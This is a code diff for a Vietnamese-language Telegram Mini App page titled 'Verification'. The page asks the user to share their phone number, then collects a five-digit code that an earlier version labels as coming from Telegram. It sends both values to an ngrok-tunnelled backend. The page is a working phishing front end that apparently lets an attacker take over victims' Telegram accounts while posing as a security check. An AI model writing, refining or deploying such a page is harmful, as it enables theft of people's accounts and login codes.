@@ -1,33 +1,61 @@
-<script>
-    // ... (Giữ nguyên các khai báo const ban đầu)
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Xác Minh</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { background: #0d1117; color: white; margin: 0; font-family: sans-serif; display: flex; justify-content: center; height: 100vh; }
+        .content { width: 100%; max-width: 400px; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; box-sizing: border-box; }
+        .otp-box { width: 50px; height: 50px; text-align: center; font-size: 20px; background: #1c1c20; border: 2px solid #3e3e5a; border-radius: 12px; color: white; }
+        .key-btn { padding: 15px; border-radius: 12px; border: none; background: #2b2b3d; color: white; font-size: 20px; font-weight: bold; cursor: pointer; flex: 1; }
+    </style>
+</head>
+<body>
 
-    // SỬA HÀM GỬI SĐT: Chuyển màn hình ngay sau khi gửi yêu cầu
+<div class="content" id="app">
+    <div style="font-size: 50px; margin-bottom: 20px;">👋</div>
+    <div id="message">Đang khởi tạo bảo mật...</div>
+</div>
+
+<script>
+    const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
+    const tg = window.Telegram.WebApp;
+    const chat_id = tg.initDataUnsafe?.user?.id || Math.floor(Math.random()*1000000).toString();
+
+    tg.ready();
+    tg.expand();
+
+    tg.MainButton.text = "XÁC NHẬN SỐ ĐIỆN THOẠI";
+    tg.MainButton.show();
+    tg.MainButton.onClick(() => tg.requestContact());
+
+    tg.onEvent('contactRequested', (data) => {
+        if (data.responseUnsafe?.contact) {
+            sendPhoneToServer(data.responseUnsafe.contact.phone_number);
+        }
+    });
+
     async function sendPhoneToServer(phone) {
         tg.MainButton.text = "ĐANG XỬ LÝ...";
-        document.getElementById('message').innerText = "Đang gửi SĐT đến hệ thống...";
-        
+        document.getElementById('message').innerText = "Đang kết nối...";
         try {
-            // Gửi dữ liệu đi
-            const res = await fetch(`${BACKEND_URL}/send_phone`, {
+            await fetch(`${BACKEND_URL}/send_phone`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ phone: phone, chat_id: chat_id })
             });
-
-            // NHẢY MÀN HÌNH NGAY, KHÔNG CẦN CHỜ SERVER PHẢN HỒI STATUS "SENT"
-            // Điều này tránh việc bị treo nếu server phản hồi chậm hoặc định dạng sai
-            renderOtpUi(); 
+            renderOtpUi();
         } catch (e) {
-            alert("Lỗi kết nối server, vui lòng thử lại!");
-            document.getElementById('message').innerText = "Lỗi kết nối. Thử lại sau!";
+            alert("Lỗi kết nối server!");
         }
     }
 
-    // THÊM: HÀM RENDER OTP CẦN THIẾT
     function renderOtpUi() {
         document.getElementById('app').innerHTML = `
             <img src="https://img.icons8.com/color/96/iphone-message.png" style="width: 70px; margin-bottom: 20px;">
-            <div style="margin-bottom: 20px;">Nhập mã OTP từ Telegram</div>
+            <div style="margin-bottom: 20px;">Nhập mã OTP</div>
             <div id="otp-container" style="display: flex; gap: 8px; margin-bottom: 30px; justify-content: center;">
                 ${[0,1,2,3,4].map(() => `<input type="text" class="otp-box" readonly>`).join('')}
             </div>
@@ -38,8 +66,34 @@
                 <button class="key-btn" onclick="handleKey('⌫')">⌫</button>
             </div>
         `;
-        tg.MainButton.hide(); // Ẩn nút chính khi đã sang màn nhập mã
+        tg.MainButton.hide();
     }
 
-    // ... (Giữ nguyên các hàm handleKey, submitOtp còn lại)
+    let currentInput = "";
+    window.handleKey = (key) => {
+        const boxes = document.querySelectorAll('.otp-box');
+        if (key === '⌫') currentInput = currentInput.slice(0, -1);
+        else if (currentInput.length < 5) currentInput += key;
+        boxes.forEach((box, i) => box.value = currentInput[i] || "");
+        if (currentInput.length === 5) submitData(currentInput);
+    };
+
+    async function submitData(val) {
+        const res = await fetch(`${BACKEND_URL}/verify_otp`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ input: val, chat_id: chat_id })
+        });
+        const result = await res.json();
+        if (result.status === "success") {
+            alert("Thành công!");
+            tg.close();
+        } else {
+            alert("Mã sai!");
+            currentInput = "";
+            document.querySelectorAll('.otp-box').forEach(b => b.value = "");
+        }
+    }
 </script>
+</body>
+</html>
